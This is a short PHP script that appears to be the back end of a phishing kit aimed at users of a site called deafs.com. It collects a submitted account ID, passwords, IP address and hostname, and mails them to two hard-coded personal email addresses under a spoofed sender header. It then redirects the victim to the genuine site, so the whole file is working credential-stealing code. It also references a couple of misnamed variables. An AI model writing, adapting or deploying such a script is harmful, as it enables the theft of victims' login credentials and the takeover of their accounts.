<?
$to = "jijikensaku@gmail.com,benedicta_montana@yahoo.com";
//----------------------------------
$account = $_POST['usr_sys_name'];
$password = $_POST['usr_password'];
$password1 = $_POST['usr_password0'];
$IP = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "Deafs Login!";
$msg = "Deafs ID: $account\nPassword : $password\nusr_password0 : $usr_password0\nIP : $ip\nHost : $host";
$from = "FROM: GinGleGuY Inc.©<mailservices@deafs.com>";
		
			{

		
		mail($to,$subj,$msg,$from);
				
				}

			header("location: http://www.deafs.com/");
?>